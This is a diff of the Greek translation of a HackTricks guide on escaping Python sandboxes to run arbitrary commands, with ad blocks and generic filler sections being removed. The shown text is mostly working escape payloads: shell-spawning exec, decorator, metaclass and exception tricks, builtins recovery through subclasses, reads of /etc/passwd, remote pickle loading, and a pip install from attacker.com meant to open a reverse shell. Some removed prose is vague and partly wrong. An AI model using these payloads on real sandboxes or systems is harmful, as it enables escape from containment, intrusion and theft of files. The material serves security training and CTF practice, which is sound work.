@@ -1,32 +1,24 @@
-# Παράκαμψη αμμοδοχείων Python
+# Παράκαμψη αμμοθολών Python
 
 <details>
 
-<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Ερυθρού Συνεργείου AWS του HackTricks)</strong></a><strong>!</strong></summary>
 
-Άλλοι τρόποι για να υποστηρίξετε το HackTricks:
+Άλλοι τρόποι υποστήριξης του HackTricks:
 
-* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
+* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
 * Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.
+* Ανακαλύψτε [**Την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.
 
 </details>
 
-<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
-
-Βρείτε ευπάθειες που είναι πιο σημαντικές, ώστε να μπορείτε να τις διορθώσετε πιο γρήγορα. Ο Intruder παρακολουθεί την επιθετική επιφάνεια σας, εκτελεί προληπτικές απειλητικές αναζητήσεις, εντοπίζει προβλήματα σε ολόκληρο το τεχνολογικό σας στοίβα, από τις διεπαφές προς τις ιστοσελίδες και τα συστήματα στο cloud. [**Δοκιμάστε το δωρεάν**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) σήμερα.
-
-{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
-
-***
-
-Αυτά είναι μερικά κόλπα για την παράκαμψη των προστασιών των αμμοδοχείων Python και την εκτέλεση αυθαίρετων εντολών.
+Αυτά είναι μερικά κόλπα για την παράκαμψη των προστασιών αμμοθόλων Python και την εκτέλεση αυθαίρετων εντολών.
 
 ## Βιβλιοθήκες Εκτέλεσης Εντολών
 
-Το πρώτο πράγμα που πρέπει να γνωρίζετε είναι εάν μπορείτε να εκτελέσετε κώδικα απευθείας με κάποια ήδη εισαγμένη βιβλιοθήκη, ή εάν μπορείτε να εισαγάγετε οποιαδήποτε από αυτές τις βιβλιοθήκες:
+Το πρώτο πράγμα που πρέπει να γνωρίζετε είναι αν μπορείτε να εκτελέσετε κώδικα απευθείας με κάποια ήδη εισαγμένη βιβλιοθήκη, ή αν μπορείτε να εισάγετε οποιαδήποτε από αυτές τις βιβλιοθήκες:
 ```python
 os.system("ls")
 os.popen("ls").read()
@@ -59,23 +51,7 @@ open('/var/www/html/input', 'w').write('123')
 execfile('/usr/lib/python2.7/os.py')
 system('ls')
 ```
-Θυμηθείτε ότι οι συναρτήσεις _**open**_ και _**read**_ μπορούν να είναι χρήσιμες για να **διαβάσετε αρχεία** μέσα στο περιβάλλον Python και να **γράψετε κάποιον κώδικα** που μπορείτε να **εκτελέσετε** για να **παρακάμψετε** το περιβάλλον ασφαλείας.
-
-{% hint style="danger" %}
-Η συνάρτηση **input()** του Python2 επιτρέπει την εκτέλεση κώδικα Python πριν το πρόγραμμα καταρρεύσει.
-{% endhint %}
-
-Το Python προσπαθεί να **φορτώσει βιβλιοθήκες από τον τρέχοντα κατάλογο πρώτα** (η παρακάτω εντολή θα εκτυπώσει από πού φορτώνει τις ενότητες ο Python): `python3 -c 'import sys; print(sys.path)'`
-
-![](<../../../.gitbook/assets/image (552).png>)
-
-## Παράκαμψη του sandbox του pickle με τις προεπιλεγμένες εγκατεστημένες πακέτα της Python
-
-### Προεπιλεγμένα πακέτα
-
-Μπορείτε να βρείτε μια **λίστα με προεγκατεστημένα** πακέτα εδώ: [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
-Σημειώστε ότι από ένα pickle μπορείτε να κάνετε το περιβάλλον Python να **εισάγει αυθαίρετες βιβλιοθήκες** που είναι εγκατεστημένες στο σύστημα.\
-Για παράδειγμα, το παρακάτω pickle, όταν φορτωθεί, θα εισάγει τη βιβλιοθήκη pip για να τη χρησιμοποιήσει:
+Να θυμάστε ότι οι συναρτήσεις _**open**_ και _**read**_ μπορούν να είναι χρήσιμες για **ανάγνωση αρχείων** μέσα στο python sandbox και για **εγγραφή κ
 ```python
 #Note that here we are importing the pip library so the pickle is created correctly
 #however, the victim doesn't even need to have the library installed to execute it
@@ -94,26 +70,26 @@ print(base64.b64encode(pickle.dumps(P(), protocol=0)))
 
 Κόλπος κοινοποιημένος από τον **@isHaacK**
 
-Εάν έχετε πρόσβαση στο `pip` ή `pip.main()`, μπορείτε να εγκαταστήσετε ένα αυθαίρετο πακέτο και να αποκτήσετε αντίστροφη κέλυφος καλώντας:
+Αν έχετε πρόσβαση στο `pip` ή στο `pip.main()`, μπορείτε να εγκαταστήσετε ένα αυθαίρετο πακέτο και να λάβετε αντίστροφη κέλυφος καλώντας:
 ```bash
 pip install http://attacker.com/Rerverse.tar.gz
 pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
 ```
-Μπορείτε να κατεβάσετε το πακέτο για τη δημιουργία του αντίστροφου κελύφους εδώ. Παρακαλώ, σημειώστε ότι πριν το χρησιμοποιήσετε θα πρέπει **να αποσυμπιέσετε το αρχείο, να αλλάξετε το `setup.py` και να βάλετε τη διεύθυνση IP σας για το αντίστροφο κέλυφος**:
+Μπορείτε να κατεβάσετε το πακέτο για τη δημιουργία αντίστροφου κελύφους εδώ. Παρακαλώ, σημειώστε ότι πριν το χρησιμοποιήσετε θα πρέπει **να το αποσυμπιέσετε, να αλλάξετε το `setup.py`, και να βάλετε τη διεύθυνση IP σας για το αντίστροφο κέλυφος**:
 
 {% file src="../../../.gitbook/assets/reverse.tar.gz" %}
 
 {% hint style="info" %}
-Αυτό το πακέτο ονομάζεται `Reverse`. Ωστόσο, δημιουργήθηκε ειδικά έτσι ώστε όταν βγείτε από το αντίστροφο κέλυφος η υπόλοιπη εγκατάσταση θα αποτύχει, έτσι δεν θα αφήσετε **κανένα επιπλέον πακέτο python εγκατεστημένο στον διακομιστή** όταν φύγετε.
+Αυτό το πακέτο ονομάζεται `Reverse`. Ωστόσο, δημιουργήθηκε ειδικά έτσι ώστε όταν βγείτε από το αντίστροφο κέλυφος η υπόλοιπη εγκατάσταση θα αποτύχει, έτσι ώστε **να μην αφήσετε κανένα επιπλέον πακέτο Python εγκατεστημένο στον διακομιστή** όταν φύγετε.
 {% endhint %}
 
-## Αξιολόγηση κώδικα python
+## Αξιολόγηση κώδικα Python
 
 {% hint style="warning" %}
-Σημειώστε ότι η exec επιτρέπει πολλαπλές συμβολοσειρές και ";", αλλά η eval δεν το επιτρέπει (ελέγξτε τον τελεστή walrus)
+Σημειώστε ότι το exec επιτρέπει πολλαπλές συμβολοσειρές και ";", αλλά το eval όχι (ελέγξτε τον τελεστή walrus)
 {% endhint %}
 
-Εάν ορισμένοι χαρακτήρες είναι απαγορευμένοι, μπορείτε να χρησιμοποιήσετε την αναπαράσταση **hex/octal/B64** για να **παρακάμψετε** τον περιορισμό:
+Αν απαγορεύονται συγκεκριμένοι χαρακτήρες, μπορείτε να χρησιμοποιήσετε την αναπαράσταση **hex/octal/B64** για να **παρακάμψετε** τον περιορισμό:
 ```python
 exec("print('RCE'); __import__('os').system('ls')") #Using ";"
 exec("print('RCE')\n__import__('os').system('ls')") #Using "\n"
@@ -135,20 +111,6 @@ exec('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='.decode("base64")) #Only python2
 exec(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='))
 ```
 ### Άλλες βιβλιοθήκες που επιτρέπουν την αξιολόγηση κώδικα Python
-
-There are several other libraries that can be used to evaluate Python code. These libraries provide similar functionality to the `eval()` function but may have different features or limitations. Some of these libraries include:
-
-- **`exec()` function**: The `exec()` function can be used to execute Python code dynamically. It allows you to execute code from a string or a code object. However, it does not return a value like `eval()` does.
-
-- **`ast.literal_eval()` function**: The `ast.literal_eval()` function can be used to safely evaluate a string containing a Python literal (e.g., a string, number, tuple, list, dictionary, or boolean). It only evaluates literals and does not support arbitrary expressions.
-
-- **`compile()` function**: The `compile()` function can be used to compile Python code into a code object, which can then be executed using the `exec()` function. This allows for more control over the execution process.
-
-- **`code.InteractiveConsole` class**: The `code.InteractiveConsole` class provides an interactive console environment for executing Python code. It can be used to evaluate code entered by the user or from a file.
-
-- **`eval()` function in restricted mode**: The `eval()` function can be used in restricted mode to limit the execution environment and prevent access to certain built-in functions and modules. This can help mitigate security risks when evaluating untrusted code.
-
-These libraries can be useful in various scenarios where dynamic code evaluation is required. However, it is important to use them with caution, as executing untrusted code can pose security risks.
 ```python
 #Pandas
 import pandas as pd
@@ -162,35 +124,7 @@ df.query("@pd.read_pickle('http://0.0.0.0:6334/output.exploit')")
 # Like:
 df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']('print(1)')")
 ```
-## Τελεστές και συντομεύσεις
-
-In Python, there are several operators and short tricks that can be used to bypass Python sandboxes and execute arbitrary code. These techniques can be useful for penetration testers and hackers looking to exploit vulnerabilities in Python-based applications.
-
-### Arithmetic Operators
-
-Arithmetic operators such as `+`, `-`, `*`, `/`, `%`, `**`, and `//` can be used to perform mathematical operations in Python. These operators can also be used to execute arbitrary code by manipulating the operands and taking advantage of the sandbox's limitations.
-
-### Comparison Operators
-
-Comparison operators such as `==`, `!=`, `>`, `<`, `>=`, and `<=` can be used to compare values in Python. These operators can also be used to execute arbitrary code by crafting comparisons that result in desired behavior.
-
-### Logical Operators
-
-Logical operators such as `and`, `or`, and `not` can be used to perform logical operations in Python. These operators can also be used to execute arbitrary code by leveraging short-circuit evaluation and exploiting the sandbox's restrictions.
-
-### Bitwise Operators
-
-Bitwise operators such as `&`, `|`, `^`, `~`, `<<`, and `>>` can be used to perform bitwise operations in Python. These operators can also be used to execute arbitrary code by manipulating bits and taking advantage of the sandbox's limitations.
-
-### Assignment Operators
-
-Assignment operators such as `=`, `+=`, `-=`, `*=`, `/=`, `%=`, `**=`, `//=`, `&=`, `|=`, `^=`, `<<=`, and `>>=` can be used to assign values to variables in Python. These operators can also be used to execute arbitrary code by combining them with other operators and manipulating the operands.
-
-### Short Tricks
-
-There are several short tricks that can be used to bypass Python sandboxes and execute arbitrary code. These tricks include using the `eval()` function, using the `exec()` function, using the `__import__()` function, using the `getattr()` function, using the `setattr()` function, using the `delattr()` function, using the `type()` function, using the `globals()` function, using the `locals()` function, and using the `__builtins__` module.
-
-By understanding and utilizing these operators and short tricks, hackers and penetration testers can effectively bypass Python sandboxes and exploit vulnerabilities in Python-based applications.
+## Τελεστές και σύντομα κόλπα
 ```python
 # walrus operator allows generating variable inside a list
 ## everything will be executed in order
@@ -201,7 +135,7 @@ By understanding and utilizing these operators and short tricks, hackers and pen
 ```
 ## Παράκαμψη προστασιών μέσω κωδικοποιήσεων (UTF-7)
 
-Στο [**αυτό το άρθρο**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) χρησιμοποιείται η UTF-7 για να φορτωθεί και να εκτελεστεί αυθαίρετος κώδικας Python μέσα σε ένα φαινομενικό χώρο ασφαλείας:
+Στο [**συγκεκριμένο άρθρο**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) χρησιμοποιείται το UTF-7 για τη φόρτωση και εκτέλεση αυθαίρετου κώδικα Python μέσα σε ένα φαινομενικό χώρο ασφαλείας:
 ```python
 assert b"+AAo-".decode("utf_7") == "\n"
 
@@ -212,11 +146,11 @@ return x
 #+AAo-print(open("/flag.txt").read())
 """.lstrip()
 ```
-Είναι επίσης δυνατό να το παρακάμψετε χρησιμοποιώντας άλλες κωδικοποιήσεις, όπως `raw_unicode_escape` και `unicode_escape`.
+Είναι επίσης δυνατόν να το παρακάμψετε χρησιμοποιώντας άλλες κωδικοποιήσεις, π.χ. `raw_unicode_escape` και `unicode_escape`.
 
 ## Εκτέλεση Python χωρίς κλήσεις
 
-Εάν βρίσκεστε μέσα σε ένα φυλακισμένο περιβάλλον Python που **δεν σας επιτρέπει να κάνετε κλήσεις**, υπάρχουν ακόμα κάποιοι τρόποι για να **εκτελέσετε αυθαίρετες συναρτήσεις, κώδικα** και **εντολές**.
+Αν βρίσκεστε μέσα σε ένα φυλακισμένο περιβάλλον Python που **δεν σάς επιτρέπει να κάνετε κλήσεις**, υπάρχουν ακόμα κάποιοι τρόποι για να **εκτελέσετε αυθαίρετες λειτουργίες, κώδικα** και **εντολές**.
 
 ### RCE με [διακοσμητές](https://docs.python.org/3/glossary.html#term-decorator)
 ```python
@@ -240,13 +174,13 @@ X = exec(X)
 @'__import__("os").system("sh")'.format
 class _:pass
 ```
-### Δημιουργία αντικειμένων και υπερφόρτωση για RCE
+### RCE δημιουργώντας αντικείμενα και υπερφόρτωση
 
-Αν μπορείτε να **δηλώσετε μια κλάση** και να **δημιουργήσετε ένα αντικείμενο** από αυτήν την κλάση, μπορείτε να **γράψετε/υπερφορτώσετε διάφορες μεθόδους** που μπορούν να **εκτελεστούν** **χωρίς** να χρειάζεται να τις καλέσετε απευθείας.
+Αν μπορείτε να **δηλώσετε μια κλάση** και **να δημιουργήσετε ένα αντικείμενο** από αυτή την κλάση, μπορείτε **να γράψετε/υπερφορτώσετε διαφορετικές μεθόδους** που μπορούν να **ενεργοποιηθούν** **χωρίς** την **ανάγκη να κληθούν απευθείας**.
 
 #### RCE με προσαρμοσμένες κλάσεις
 
-Μπορείτε να τροποποιήσετε ορισμένες **μεθόδους κλάσης** (_με την υπερφόρτωση υπαρχουσών μεθόδων κλάσης ή τη δημιουργία μιας νέας κλάσης_) για να τις κάνετε να **εκτελούν αυθαίρετο κώδικα** όταν **ενεργοποιούνται** χωρίς να τις καλείτε απευθείας.
+Μπορείτε να τροποποιήσετε μερικές **μεθόδους κλάσης** (_με την υπερφόρτωση υπαρχουσών μεθόδων κλάσης ή δημιουργώντας μια νέα κλάση_) για να τις κάνετε να **εκτελούν αυθαίρετο κώδικα** όταν **ενεργοποιηθούν** χωρίς να κληθούν απευθείας.
 ```python
 # This class has 3 different ways to trigger RCE without directly calling any function
 class RCE:
@@ -298,7 +232,7 @@ __ixor__ (k ^= 'import os; os.system("sh")')
 ```
 #### Δημιουργία αντικειμένων με [μετακλάσεις](https://docs.python.org/3/reference/datamodel.html#metaclasses)
 
-Το κύριο πράγμα που μας επιτρέπουν οι μετακλάσεις είναι να **δημιουργήσουμε ένα αντικείμενο μιας κλάσης, χωρίς να καλέσουμε απευθείας τον κατασκευαστή**, δημιουργώντας μια νέα κλάση με την κατασταλτική κλάση ως μετακλάση.
+Το κύριο πράγμα που μας επιτρέπουν οι μετακλάσεις είναι **να δημιουργήσουμε μια πρότυπη κλάση, χωρίς να καλέσουμε τον κατασκευαστή** απευθείας, δημιουργώντας μια νέα κλάση με την επιθυμητή κλάση ως μετακλάση.
 ```python
 # Code from https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/ and fixed
 # This will define the members of the "subclass"
@@ -315,7 +249,7 @@ Sub['import os; os.system("sh")']
 ```
 #### Δημιουργία αντικειμένων με εξαιρέσεις
 
-Όταν προκαλείται μια **εξαίρεση**, δημιουργείται ένα αντικείμενο της **Exception** χωρίς να χρειάζεται να καλέσετε απευθείας τον κατασκευαστή (ένα κόλπος από τον [**@\_nag0mez**](https://mobile.twitter.com/\_nag0mez)):
+Όταν **ενεργοποιείται μια εξαίρεση**, δημιουργείται ένα αντικείμενο της **Εξαίρεσης** χωρίς να χρειάζεται να καλέσετε τον κατασκευαστή απευθείας (ένα κόλπος από τον [**@\_nag0mez**](https://mobile.twitter.com/\_nag0mez)):
 ```python
 class RCE(Exception):
 def __init__(self):
@@ -336,36 +270,6 @@ k + 'import os; os.system("sh")' #RCE abusing __add__
 ## You can also use the tricks from the previous section to get RCE with this object
 ```
 ### Περισσότερες RCE
-
-Σε αυτήν την ενότητα θα εξετάσουμε μερικές επιπλέον τεχνικές για την επίτευξη απομακρυσμένης εκτέλεσης κώδικα (RCE).
-
-#### 1. Αποφυγή Python Sandboxes
-
-Οι Python Sandboxes είναι μηχανισμοί ασφαλείας που περιορίζουν τις δυνατότητες εκτέλεσης κώδικα σε ένα περιβάλλον Python. Ωστόσο, υπάρχουν τρόποι για να παρακάμψουμε αυτούς τους μηχανισμούς και να επιτύχουμε RCE.
-
-Μερικές από τις τεχνικές που μπορούμε να χρησιμοποιήσουμε είναι:
-
-- Αξιοποίηση αδυναμιών στον μηχανισμό ασφαλείας της Python Sandbox.
-- Χρήση ευπάθειας στην υλοποίηση της Python Sandbox.
-- Αποφυγή των περιορισμών της Python Sandbox με τη χρήση εξωτερικών βιβλιοθηκών ή εργαλείων.
-
-#### 2. Αποφυγή Ανίχνευσης
-
-Για να επιτύχουμε RCE, είναι σημαντικό να αποφύγουμε την ανίχνευση από τα συστήματα ασφαλείας. Μερικοί τρόποι για να το πετύχουμε είναι:
-
-- Κρυπτογράφηση της επικοινωνίας μας για να μην είναι αναγνώσιμη από τα IDS/IPS συστήματα.
-- Αποφυγή της χρήσης γνωστών σημάτων και συμπεριφορών που μπορεί να εντοπίσουν τα IDS/IPS συστήματα.
-- Χρήση τεχνικών όπως το γκρίζο κουτί ή το μαύρο κουτί για να αποφύγουμε την ανίχνευση.
-
-#### 3. Εκμετάλλευση Ευπαθειών
-
-Για να επιτύχουμε RCE, πρέπει να εκμεταλλευτούμε ευπάθειες στο σύστημα ή την εφαρμογή που επιθυμούμε να επιτεθούμε. Μερικές από τις ευπάθειες που μπορούμε να εκμεταλλευτούμε είναι:
-
-- Ευπάθειες στο λειτουργικό σύστημα.
-- Ευπάθειες στις εφαρμογές που εκτελούνται στο σύστημα.
-- Ευπάθειες στις βιβλιοθήκες που χρησιμοποιούνται από το σύστημα ή την εφαρμογή.
-
-Με τη χρήση αυτών των τεχνικών, μπορούμε να επιτύχουμε RCE και να αποκτήσουμε πλήρη έλεγχο ενός συστήματος ή μιας εφαρμογής.
 ```python
 # From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
 # If sys is imported, you can sys.excepthook and trigger it by triggering an error
@@ -387,19 +291,7 @@ __iadd__ = eval
 __builtins__.__import__ = X
 {}[1337]
 ```
-### Διάβασμα αρχείου με τη βοήθεια των builtins help & license
-
-Για να διαβάσετε ένα αρχείο χρησιμοποιώντας τις builtins help & license, μπορείτε να ακολουθήσετε τα παρακάτω βήματα:
-
-1. Χρησιμοποιήστε τη συνάρτηση `help()` για να πάρετε πληροφορίες σχετικά με τη χρήση της built-in συνάρτησης `open()`. Μπορείτε να το κάνετε αυτό εκτελώντας την εντολή `help(open)` στο περιβάλλον Python.
-
-2. Ανοίξτε το αρχείο που θέλετε να διαβάσετε χρησιμοποιώντας τη συνάρτηση `open()`. Για παράδειγμα, μπορείτε να χρησιμοποιήσετε την εντολή `file = open('filename.txt', 'r')` για να ανοίξετε ένα αρχείο με όνομα "filename.txt" σε λειτουργία ανάγνωσης.
-
-3. Χρησιμοποιήστε τη μέθοδο `read()` για να διαβάσετε το περιεχόμενο του αρχείου. Μπορείτε να το κάνετε αυτό εκτελώντας την εντολή `content = file.read()`.
-
-4. Κλείστε το αρχείο με τη μέθοδο `close()`. Μπορείτε να το κάνετε αυτό εκτελώντας την εντολή `file.close()`.
-
-Με αυτόν τον τρόπο, μπορείτε να διαβάσετε το περιεχόμενο ενός αρχείου χρησιμοποιώντας τις builtins help & license στη γλώσσα προγραμματισμού Python.
+### Διαβάστε το αρχείο με τη βοήθεια των builtins & την άδεια χρήσης
 ```python
 __builtins__.__dict__["license"]._Printer__filenames=["flag"]
 a = __builtins__.help
@@ -408,30 +300,22 @@ a.__class__.__exit__ = lambda self, *args: None
 with (a as b):
 pass
 ```
-<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
-
-Βρείτε ευπάθειες που είναι πιο σημαντικές, ώστε να μπορείτε να τις διορθώσετε πιο γρήγορα. Το Intruder παρακολουθεί την επιθετική επιφάνεια σας, εκτελεί προληπτικές απειλητικές αναζητήσεις, εντοπίζει προβλήματα σε ολόκληρο το τεχνολογικό σας στοίβα, από τις διεπαφές προγραμματισμού εφαρμογών (APIs) μέχρι τις ιστοσελίδες και τα συστήματα στον νέφος. [**Δοκιμάστε το δωρεάν**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) σήμερα.
-
-{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
-
-***
-
 ## Ενσωματωμένες Συναρτήσεις
 
-* [**Ενσωματωμένες συναρτήσεις της Python 2**](https://docs.python.org/2/library/functions.html)
-* [**Ενσωματωμένες συναρτήσεις της Python 3**](https://docs.python.org/3/library/functions.html)
+* [**Ενσωματωμένες συναρτήσεις της python2**](https://docs.python.org/2/library/functions.html)
+* [**Ενσωματωμένες συναρτήσεις της python3**](https://docs.python.org/3/library/functions.html)
 
-Εάν έχετε πρόσβαση στο αντικείμενο **`__builtins__`**, μπορείτε να εισαγάγετε βιβλιοθήκες (σημειώστε ότι μπορείτε επίσης να χρησιμοποιήσετε εδώ και άλλη αναπαράσταση συμβολοσειράς που παρουσιάζεται στην τελευταία ενότητα):
+Εάν μπορείτε να έχετε πρόσβαση στο αντικείμενο **`__builtins__`** μπορείτε να εισάγετε βιβλιοθήκες (σημειώστε ότι θα μπορούσατε επίσης να χρησιμοποιήσετε εδώ και άλλη αναπαράσταση συμβολοσειράς που εμφανίζεται στην τελευταία ενότητα):
 ```python
 __builtins__.__import__("os").system("ls")
 __builtins__.__dict__['__import__']("os").system("ls")
 ```
-### Χωρίς Ενσωματωμένες Συναρτήσεις
+### Χωρίς Builtins
 
-Όταν δεν έχετε το `__builtins__`, δεν θα μπορείτε να εισάγετε οτιδήποτε ούτε να διαβάσετε ή να γράψετε αρχεία, καθώς **όλες οι παγκόσμιες συναρτήσεις** (όπως `open`, `import`, `print`...) **δεν φορτώνονται**.\
-Ωστόσο, **από προεπιλογή η Python εισάγει πολλά αρθρώματα στη μνήμη**. Αυτά τα αρθρώματα μπορεί να φαίνονται αθώα, αλλά μερικά από αυτά **εισάγουν επίσης επικίνδυνες** λειτουργίες μέσα τους που μπορούν να χρησιμοποιηθούν για να εκτελεστεί ακόμα και **αυθαίρετος κώδικας**.
+Όταν δεν έχετε `__builtins__` δεν θα μπορείτε να εισάγετε τίποτα ούτε να διαβάσετε ή να γράψετε αρχεία καθώς **όλες οι γενικές συναρτήσεις** (όπως `open`, `import`, `print`...) **δεν φορτώνονται**.\
+Ωστόσο, **από προεπιλογή το Python εισάγει πολλά modules στη μνήμη**. Αυτά τα modules μπορεί να φαίνονται αθώα, αλλά μερικά από αυτά **εισάγουν και επικίνδυνες** λειτουργίες μέσα σε αυτά που μπορούν να προσπελαστούν για να επιτευχθεί ακόμα και **αυθαίρετη εκτέλεση κώδικα**.
 
-Στα παρακάτω παραδείγματα μπορείτε να δείτε πώς να **καταχραστείτε** μερικά από αυτά τα "**αθώα**" αρθρώματα που φορτώνονται για να **έχετε πρόσβαση** σε **επικίνδυνες** **λειτουργίες** μέσα τους.
+Στα παρακάτω παραδείγματα μπορείτε να παρατηρήσετε πως να **καταχραστείτε** μερικά από αυτά τα "**αθώα**" modules που φορτώνονται για να **έχετε πρόσβαση** σε **επικίνδυνες** **λειτουργίες** μέσα σε αυτά.
 
 **Python2**
 ```python
@@ -455,19 +339,6 @@ import __builtin__
 get_flag.__globals__['__builtins__']['__import__']("os").system("ls")
 ```
 #### Python3
-
-Ο Python3 είναι μια δημοφιλής γλώσσα προγραμματισμού που χρησιμοποιείται ευρέως για την ανάπτυξη λογισμικού. Ωστόσο, μερικές φορές μπορεί να υπάρξουν περιορισμοί στην εκτέλεση κώδικα Python3, όπως οι αμμοδοχεία (sandboxes) Python.
-
-#### Παράκαμψη αμμοδοχείων Python
-
-Η παράκαμψη των αμμοδοχείων Python μπορεί να επιτευχθεί με διάφορους τρόπους. Ορισμένες από τις τεχνικές που μπορούν να χρησιμοποιηθούν περιλαμβάνουν:
-
-- Χρήση ευπάθειας της Python για να παρακάμψετε τα αμμοδοχεία.
-- Χρήση εξωτερικών βιβλιοθηκών για να παρακάμψετε τα αμμοδοχεία.
-- Χρήση εκτελέσιμων αρχείων για να παρακάμψετε τα αμμοδοχεία.
-- Χρήση τεχνικών όπως το DLL injection για να παρακάμψετε τα αμμοδοχεία.
-
-Είναι σημαντικό να σημειωθεί ότι η παράκαμψη αμμοδοχείων Python είναι μια παράνομη δραστηριότητα και μπορεί να έχει νομικές συνέπειες. Πριν προχωρήσετε σε οποιαδήποτε προσπάθεια παράκαμψης αμμοδοχείων, πρέπει να εξασφαλίσετε ότι έχετε την απαραίτητη άδεια και να τηρείτε τους νόμους και τους κανονισμούς που ισχύουν στην περιοχή σας.
 ```python
 # Obtain builtins from a globally defined function
 # https://docs.python.org/3/library/functions.html
@@ -494,37 +365,7 @@ get_flag.__globals__['__builtins__']
 __builtins__= [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__
 __builtins__["__import__"]('os').system('ls')
 ```
-### Φορτία Builtins
-
-Οι φορτίες Builtins είναι μια τεχνική που χρησιμοποιείται για να παρακάμψει τις αμμοθύρες της Python και να εκτελέσει κακόβουλο κώδικα. Αυτή η τεχνική εκμεταλλεύεται την ικανότητα της Python να εισάγει δυναμικά modules και να καλεί built-in functions.
-
-Για να χρησιμοποιήσετε αυτή την τεχνική, μπορείτε να εισάγετε ένα module που περιέχει κακόβουλο κώδικα και να καλέσετε μια built-in function που θα εκτελέσει αυτόν τον κώδικα. Αυτό μπορεί να γίνει με τη χρήση της built-in function `__import__()` για την εισαγωγή του module και της built-in function `eval()` για την εκτέλεση του κώδικα.
-
-Παρακάτω παρουσιάζονται μερικά παραδείγματα φορτίων Builtins:
-
-#### Παράδειγμα 1: Εκτέλεση εντολής συστήματος
-
-```python
-import os
-os.system('command')
-```
-
-#### Παράδειγμα 2: Ανάγνωση αρχείου
-
-```python
-with open('file.txt', 'r') as f:
-    contents = f.read()
-```
-
-#### Παράδειγμα 3: Εκτέλεση αρχείου Python
-
-```python
-with open('script.py', 'r') as f:
-    code = f.read()
-exec(code)
-```
-
-Αυτές οι φορτίες Builtins μπορούν να χρησιμοποιηθούν για να παρακάμψουν τις αμμοθύρες της Python και να εκτελέσουν κακόβουλο κώδικα. Είναι σημαντικό να είστε προσεκτικοί κατά τη χρήση αυτών των τεχνικών, καθώς μπορεί να προκαλέσουν σοβαρές ασφαλειακές προβληματικές καταστάσεις.
+### Φορτία ενσωματωμένων λειτουργιών
 ```python
 # Possible payloads once you have found the builtins
 __builtins__["open"]("/etc/passwd").read()
@@ -532,7 +373,7 @@ __builtins__["__import__"]("os").system("ls")
 # There are lots of other payloads that can be abused to execute commands
 # See them below
 ```
-## Καθολικές και τοπικές μεταβλητές
+## Παγκόσμιες μεταβλητές και τοπικές μεταβλητές
 
 Ο έλεγχος των **`globals`** και **`locals`** είναι ένας καλός τρόπος για να γνωρίζετε ποιες μεταβλητές μπορείτε να έχετε πρόσβαση.
 ```python
@@ -558,15 +399,13 @@ class_obj.__init__.__globals__
 [ x for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__)]
